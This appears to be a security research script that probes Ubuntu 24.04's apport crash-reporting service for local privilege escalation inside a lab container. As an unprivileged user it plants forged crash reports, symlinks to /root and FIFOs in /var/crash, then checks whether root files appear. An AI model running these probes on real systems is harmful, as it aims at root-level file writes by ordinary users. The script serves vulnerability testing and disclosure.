#!/usr/bin/env bash
set -u

TARGET="${1:-ubuntu24-server-lpe-target}"

if ! docker inspect "$TARGET" >/dev/null 2>&1; then
  echo "target container not found: $TARGET" >&2
  exit 1
fi

section() {
  printf '\n### %s\n' "$*"
}

root_sh() {
  docker exec "$TARGET" bash -lc "$1"
}

root_stdin() {
  docker exec -i "$TARGET" bash -s
}

user_stdin() {
  local user="$1"
  docker exec -i "$TARGET" runuser -u "$user" -- bash -s
}

cleanup_quiet() {
  docker exec "$TARGET" bash -lc '
    rm -f /var/crash/apport_autoreport_* \
          /tmp/apport_autoreport_* \
          /root/apport_autoreport_* \
          /run/apport_autoreport_*
    rm -rf /home/attacker/apport-autoreport-deep \
           /home/selfauth/apport-autoreport-deep
    systemctl reset-failed >/dev/null 2>&1 || true
  ' >/dev/null 2>&1 || true
}

trap cleanup_quiet EXIT

section "initial cleanup and target health"
cleanup_quiet
root_sh '
  cat /etc/os-release
  uname -a
  systemctl is-system-running || true
  echo "failed_units=$(systemctl --failed --no-legend | wc -l)"
  id attacker
  id selfauth
'

section "default package and unit proof"
root_sh '
  dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${db:Status-Abbrev}\n" \
    apport apport-core-dump-handler apport-symptoms python3-apport \
    python3-problem-report systemd whoopsie systemd-coredump 2>/dev/null || true
  echo "--- unit files ---"
  systemctl list-unit-files "apport*" "whoopsie*" "systemd-coredump*" --no-pager
  echo "--- live units ---"
  systemctl --type=service,socket,path,timer --all --no-pager | grep -E "apport|whoopsie|coredump" || true
  echo "--- detailed state ---"
  systemctl show apport-autoreport.path apport-autoreport.timer apport-autoreport.service apport-forward.socket \
    -p Id -p LoadState -p ActiveState -p SubState -p UnitFileState -p Result -p TriggeredBy -p Triggers \
    --no-pager || true
'

section "unit file line evidence"
root_sh '
  for f in \
    /usr/lib/systemd/system/apport-autoreport.path \
    /usr/lib/systemd/system/apport-autoreport.service \
    /usr/lib/systemd/system/apport-autoreport.timer \
    /usr/lib/systemd/system/apport-forward.socket \
    /usr/lib/systemd/system/apport-forward@.service \
    /usr/lib/systemd/system/apport-coredump-hook@.service \
    /usr/lib/systemd/system/systemd-coredump@.service.d/apport-coredump-hook.conf
  do
    echo "--- $f ---"
    if [ -e "$f" ]; then nl -ba "$f"; else echo "MISSING"; fi
  done
'

section "code line evidence"
root_sh '
  echo "--- whoopsie-upload-all process_report ---"
  nl -ba /usr/share/apport/whoopsie-upload-all | sed -n "35,145p"
  echo "--- whoopsie-upload-all main gate ---"
  nl -ba /usr/share/apport/whoopsie-upload-all | sed -n "151,245p"
  echo "--- apport fileutils report state helpers ---"
  nl -ba /usr/lib/python3/dist-packages/apport/fileutils.py | sed -n "195,235p"
  nl -ba /usr/lib/python3/dist-packages/apport/fileutils.py | sed -n "297,368p"
  nl -ba /usr/lib/python3/dist-packages/apport/fileutils.py | sed -n "404,437p"
  echo "--- apport crash privilege transitions ---"
  nl -ba /usr/share/apport/apport | sed -n "130,225p"
  nl -ba /usr/share/apport/apport | sed -n "1013,1229p"
'

section "state paths and hook trust roots"
root_sh '
  stat -Lc "%A %U %G %a %n" \
    /var/crash /var/lib/apport /var/lib/apport/coredump /run/apport.socket \
    /usr/share/apport /usr/share/apport/package-hooks /etc/apport 2>/dev/null || true
  echo "--- hook/config owners ---"
  find /usr/share/apport/package-hooks /etc/apport -maxdepth 2 -printf "%M %u %g %p\n" 2>/dev/null | sort | sed -n "1,120p"
  echo "--- user writable hook/config roots as attacker ---"
'
user_stdin attacker <<'ATTACKER_WRITABLE'
for d in /usr/share/apport /usr/share/apport/package-hooks /etc/apport /var/lib/apport /var/lib/apport/coredump /var/crash; do
  if [ -w "$d" ]; then echo "WRITABLE $d"; else echo "not_writable $d"; fi
done
ATTACKER_WRITABLE

section "attacker path trigger attempt"
user_stdin attacker <<'ATTACKER_TRIGGER'
set -u
echo "identity=$(id)"
cat > /var/crash/apport_autoreport_attacker.crash <<'REPORT'
ProblemType: Crash
Date: Sat May 16 00:00:00 2026
DistroRelease: Ubuntu 24.04
ExecutablePath: /usr/bin/false
Package: coreutils 9.4-3ubuntu6
ProcCmdline: /usr/bin/false
Signal: 11
REPORT
touch /var/crash/apport_autoreport_attacker.upload
touch /var/crash/apport_autoreport_attacker.uploaded
ln -s /root/apport_autoreport_upload_target /var/crash/apport_autoreport_symlink.upload
ln -s /root/apport_autoreport_crash_target /var/crash/apport_autoreport_symlink.crash
mkfifo /var/crash/apport_autoreport_fifo.crash
ls -l /var/crash/apport_autoreport_*
ATTACKER_TRIGGER

sleep 2
root_sh '
  echo "--- after attacker /var/crash changes ---"
  systemctl show apport-autoreport.path apport-autoreport.service \
    -p Id -p ActiveState -p SubState -p Result -p ExecMainStatus -p NRestarts --no-pager || true
  journalctl -u apport-autoreport.service --since "-3 min" --no-pager || true
  ls -l /root/apport_autoreport_* 2>/dev/null || echo "no root apport_autoreport target"
'

section "normal user systemd start attempts"
for user in attacker selfauth; do
  echo "--- $user ---"
  user_stdin "$user" <<'USER_SYSTEMCTL'
for unit in apport-autoreport.path apport-autoreport.timer apport-autoreport.service apport-coredump-hook@manual.service; do
  echo "start $unit"
  timeout 8 systemctl start "$unit" 2>&1
  echo "rc=$?"
done
USER_SYSTEMCTL
done

section "normal user direct whoopsie-upload-all"
for user in attacker selfauth; do
  echo "--- $user ---"
  user_stdin "$user" <<'USER_WHOOPSIE'
id
timeout 15 /usr/share/apport/whoopsie-upload-all --timeout 0 --loglevel debug 2>&1
echo "rc=$?"
USER_WHOOPSIE
done

section "apport-forward socket reachability"
for user in attacker selfauth; do
  echo "--- $user ---"
  user_stdin "$user" <<'USER_SOCKET'
python3 - <<'PY'
import os, socket
print("id", os.getuid(), os.getgid(), os.getgroups())
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect("/run/apport.socket")
    print("connect=OK")
except OSError as e:
    print(f"connect=FAIL errno={e.errno} {e.strerror}")
PY
USER_SOCKET
done

section "attacker .upload/.uploaded and mark_report_upload semantics"
user_stdin attacker <<'ATTACKER_MARK'
set -u
python3 - <<'PY'
import os
import stat
import time
import traceback
import apport.fileutils
from problem_report import ProblemReport

def show(path):
    try:
        st = os.lstat(path)
    except FileNotFoundError:
        print("MISSING", path)
        return
    kind = "link" if stat.S_ISLNK(st.st_mode) else "fifo" if stat.S_ISFIFO(st.st_mode) else "reg" if stat.S_ISREG(st.st_mode) else oct(st.st_mode)
    target = ""
    if stat.S_ISLNK(st.st_mode):
        target = " -> " + os.readlink(path)
    print(f"{kind} {oct(st.st_mode & 0o7777)} uid={st.st_uid} gid={st.st_gid} size={st.st_size} {path}{target}")

def write_report(path):
    pr = ProblemReport("Crash")
    pr["Date"] = time.asctime()
    pr["DistroRelease"] = "Ubuntu 24.04"
    pr["ExecutablePath"] = "/usr/bin/false"
    pr["Package"] = "coreutils 9.4-3ubuntu6"
    pr["ProcCmdline"] = "/usr/bin/false"
    pr["Signal"] = "11"
    with open(path, "wb") as f:
        pr.write(f)

report = "/var/crash/apport_autoreport_userapi.crash"
upload = "/var/crash/apport_autoreport_userapi.upload"
uploaded = "/var/crash/apport_autoreport_userapi.uploaded"
for p in [report, upload, uploaded, "/tmp/apport_autoreport_userapi_upload_target"]:
    try:
        os.unlink(p)
    except FileNotFoundError:
        pass
write_report(report)
print("all_reports_contains_userapi", report in apport.fileutils.get_all_reports())
apport.fileutils.mark_report_upload(report)
show(upload)

os.unlink(upload)
os.symlink("/tmp/apport_autoreport_userapi_upload_target", upload)
try:
    apport.fileutils.mark_report_upload(report)
    print("symlink_tmp_mark=OK")
except Exception as e:
    print("symlink_tmp_mark=FAIL", repr(e))
show(upload)
show("/tmp/apport_autoreport_userapi_upload_target")

try:
    os.unlink(upload)
except FileNotFoundError:
    pass
os.symlink("/root/apport_autoreport_userapi_upload_target", upload)
try:
    apport.fileutils.mark_report_upload(report)
    print("symlink_root_mark=OK")
except Exception as e:
    print("symlink_root_mark=FAIL", repr(e))
    traceback.print_exc(limit=1)
show(upload)
PY
ATTACKER_MARK

section "attacker process_report semantics with regular, symlink, fifo, and locked reports"
user_stdin attacker <<'ATTACKER_PROCESS'
set -u
cat > /tmp/apport_autoreport_process_probe.py <<'PY'
import fcntl
import os
import runpy
import stat
import subprocess
import sys
import time
import traceback
from problem_report import ProblemReport

MOD = runpy.run_path("/usr/share/apport/whoopsie-upload-all")
process_report = MOD["process_report"]

def write_report(path):
    pr = ProblemReport("Crash")
    pr["Date"] = time.asctime()
    pr["DistroRelease"] = "Ubuntu 24.04"
    pr["ExecutablePath"] = "/usr/bin/false"
    pr["Package"] = "coreutils 9.4-3ubuntu6"
    pr["ProcCmdline"] = "/usr/bin/false"
    pr["Signal"] = "11"
    with open(path, "wb") as f:
        pr.write(f)

def clean(*paths):
    for p in paths:
        try:
            os.unlink(p)
        except FileNotFoundError:
            pass

def show(path):
    try:
        st = os.lstat(path)
    except FileNotFoundError:
        print("MISSING", path)
        return
    if stat.S_ISLNK(st.st_mode):
        kind = "link -> " + os.readlink(path)
    elif stat.S_ISFIFO(st.st_mode):
        kind = "fifo"
    elif stat.S_ISREG(st.st_mode):
        kind = "regular"
    else:
        kind = oct(st.st_mode)
    print(f"{kind} {oct(st.st_mode & 0o7777)} uid={st.st_uid} gid={st.st_gid} size={st.st_size} {path}")

def call(label, path):
    print(f"CALL {label} {path}")
    try:
        res = process_report(path)
        print("RESULT", repr(res))
    except Exception as e:
        print("EXCEPTION", repr(e))
        traceback.print_exc(limit=1)

regular = "/var/crash/apport_autoreport_process_regular.crash"
clean(regular, regular[:-6] + ".upload")
write_report(regular)
call("regular", regular)
show(regular)
show(regular[:-6] + ".upload")

target = "/tmp/apport_autoreport_process_symlink_target"
link = "/var/crash/apport_autoreport_process_symlink.crash"
clean(target, link, link[:-6] + ".upload")
write_report(target)
os.symlink(target, link)
call("crash_symlink_to_regular", link)
show(link)
show(target)
show(link[:-6] + ".upload")

fifo = "/var/crash/apport_autoreport_process_fifo.crash"
clean(fifo, fifo[:-6] + ".upload")
os.mkfifo(fifo)
code = "import runpy; m=runpy.run_path('/usr/share/apport/whoopsie-upload-all'); print(m['process_report'](%r))" % fifo
try:
    proc = subprocess.run([sys.executable, "-c", code], timeout=3, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print("fifo_process_rc", proc.returncode)
    print(proc.stdout)
except subprocess.TimeoutExpired as e:
    print("fifo_process_timeout=True")
    if e.stdout:
        print(e.stdout)

locked = "/var/crash/apport_autoreport_process_locked.crash"
clean(locked, locked[:-6] + ".upload")
write_report(locked)
holder = subprocess.Popen([sys.executable, "-c", "import fcntl,time,sys; f=open(sys.argv[1], 'rb'); fcntl.flock(f, fcntl.LOCK_EX); print('lock-held', flush=True); time.sleep(5)", locked], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
print(holder.stdout.readline().strip())
call("locked", locked)
holder.wait()
show(locked)
show(locked[:-6] + ".upload")
PY
timeout 45 python3 /tmp/apport_autoreport_process_probe.py
echo "rc=$?"
ATTACKER_PROCESS

section "root marker, cleanup, and final health"
root_sh '
  echo "--- root marker check before cleanup ---"
  ls -l /root/apport_autoreport_* 2>/dev/null || echo "no root marker"
  if [ -e /root/apport_autoreport_upload_target ] || \
     [ -e /root/apport_autoreport_crash_target ] || \
     [ -e /root/apport_autoreport_userapi_upload_target ]; then
    echo "ROOT_PROOF=YES"
  else
    echo "ROOT_PROOF=NO"
  fi
'
cleanup_quiet
root_sh '
  echo "--- post-clean health ---"
  systemctl is-system-running || true
  echo "failed_units=$(systemctl --failed --no-legend | wc -l)"
  find /var/crash /tmp /root /home/attacker /home/selfauth -maxdepth 1 \
    \( -name "apport_autoreport_*" -o -name "apport-autoreport-deep" \) \
    -print 2>/dev/null || true
'
